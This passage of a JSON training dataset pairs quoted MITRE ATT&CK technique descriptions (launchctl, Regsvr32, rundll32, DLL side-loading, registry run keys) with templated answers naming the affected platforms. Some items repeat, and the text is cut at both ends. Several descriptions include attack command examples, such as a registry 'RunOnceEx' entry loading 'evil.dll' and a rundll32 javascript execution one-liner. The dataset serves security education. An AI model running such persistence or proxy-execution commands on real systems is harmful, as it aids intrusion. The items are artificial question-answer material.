NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.",
      "answer": "The provided description is related to MITRE technique Domain or Tenant Policy Modification: Group Policy Modification (T1484.001);\nTechnique Domain or Tenant Policy Modification: Group Policy Modification (T1484.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Services: Launchctl (T1569.001);\nTechnique System Services: Launchctl (T1569.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons.",
      "answer": "The provided description is related to MITRE technique System Services: Launchctl (T1569.001);\nTechnique System Services: Launchctl (T1569.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Software Discovery: Security Software Discovery (T1518.001);\nTechnique Software Discovery: Security Software Discovery (T1518.001) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "answer": "The provided description is related to MITRE technique Software Discovery: Security Software Discovery (T1518.001);\nTechnique Software Discovery: Security Software Discovery (T1518.001) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Binary Proxy Execution: Regsvr32 (T1218.010);\nTechnique System Binary Proxy Execution: Regsvr32 (T1218.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",
      "answer": "The provided description is related to MITRE technique System Binary Proxy Execution: Regsvr32 (T1218.010);\nTechnique System Binary Proxy Execution: Regsvr32 (T1218.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.",
    "context": "",
    "output": "The provided description is related to MITRE technique Defacement: Internal Defacement (T1491.001);\nTechnique Defacement: Internal Defacement (T1491.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.",
      "answer": "The provided description is related to MITRE technique Defacement: Internal Defacement (T1491.001);\nTechnique Defacement: Internal Defacement (T1491.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Binary Proxy Execution: Rundll32 (T1218.011);\nTechnique System Binary Proxy Execution: Rundll32 (T1218.011) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
      "answer": "The provided description is related to MITRE technique System Binary Proxy Execution: Rundll32 (T1218.011);\nTechnique System Binary Proxy Execution: Rundll32 (T1218.011) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project , and Azure's CLI command <code>az vm list</code> lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Cloud Infrastructure Discovery (T1580);\nTechnique Cloud Infrastructure Discovery (T1580) is applicable to platforms: IaaS;\nTherefore, the given procedure description is related to platforms: IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project , and Azure's CLI command <code>az vm list</code> lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.",
      "answer": "The provided description is related to MITRE technique Cloud Infrastructure Discovery (T1580);\nTechnique Cloud Infrastructure Discovery (T1580) is applicable to platforms: IaaS;\nTherefore, the given procedure description is related to platforms: IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
      "answer": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "answer": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or 